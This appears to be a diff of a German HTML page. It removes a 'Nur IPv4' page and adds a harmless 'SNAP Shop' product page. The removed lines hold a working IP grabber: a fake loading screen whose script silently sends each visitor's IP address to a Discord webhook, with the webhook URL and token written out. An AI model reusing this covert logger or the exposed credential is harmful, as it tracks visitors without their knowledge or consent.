@@ -2,59 +2,89 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <title>Nur IPv4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SNAP Shop</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+
     body {
-      background: #000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: radial-gradient(circle at center, #0f0f0f, #000000);
+      color: #e0f7ff;
     }
-    img {
-      max-width: 90%;
-      max-height: 90%;
+
+    header {
+      text-align: center;
+      padding: 2rem;
+      font-size: 3rem;
+      color: #b9ecff;
+      text-shadow: 0 0 10px #aef, 0 0 20px #8cf;
+      letter-spacing: 0.2em;
+    }
+
+    .products {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 2rem;
+      padding: 2rem;
+    }
+
+    .product-card {
+      background: rgba(0, 20, 30, 0.7);
+      border: 2px solid #7ee0ff;
+      box-shadow: 0 0 15px #5ad4ff;
+      padding: 1.5rem;
+      border-radius: 10px;
+      width: 200px;
+      text-align: center;
+      transition: transform 0.3s ease;
+    }
+
+    .product-card:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px #aef;
+    }
+
+    button {
+      margin-top: 1rem;
+      padding: 0.5rem 1rem;
+      background: #7ee0ff;
+      border: none;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #aef;
     }
   </style>
 </head>
 <body>
+  <header>
+    SNAP
+  </header>
 
-<img src="https://media.tenor.com/1vCm3vSUyBwAAAAC/loading-buffering.gif" alt="Lade...">
-
-<script>
-const webhookUrl = "https://discord.com/api/webhooks/1365776827787903068/StBWh9kwc5IAZVoTZWUd7ravbE3vReMNkyic1_sIlmj40NKmowSDPG_fo41vMvpSnGWv"; // Webhook hier einfügen
-
-async function getIPv4() {
-    try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-    } catch {
-        return "Fehler beim Laden";
-    }
-}
-
-async function sendToDiscord() {
-    const ipv4 = await getIPv4();
-    const embed = {
-        title: "Neue IPv4 erkannt",
-        color: 3447003,
-        fields: [
-            { name: "IPv4-Adresse", value: ipv4, inline: false }
-        ],
-        timestamp: new Date()
-    };
-
-    await fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] })
-    });
-}
-
-sendToDiscord();
-</script>
-
+  <section class="products">
+    <div class="product-card">
+      <h2>Frost Hoodie</h2>
+      <p>Kühler Look mit kantigem Style.</p>
+      <button>Kaufen</button>
+    </div>
+    <div class="product-card">
+      <h2>Ice Cap</h2>
+      <p>Snap dein Outfit mit Stil.</p>
+      <button>Kaufen</button>
+    </div>
+    <div class="product-card">
+      <h2>Frozen Socks</h2>
+      <p>Für kalte Tage – oder heiße Moves.</p>
+      <button>Kaufen</button>
+    </div>
+  </section>
 </body>
 </html>
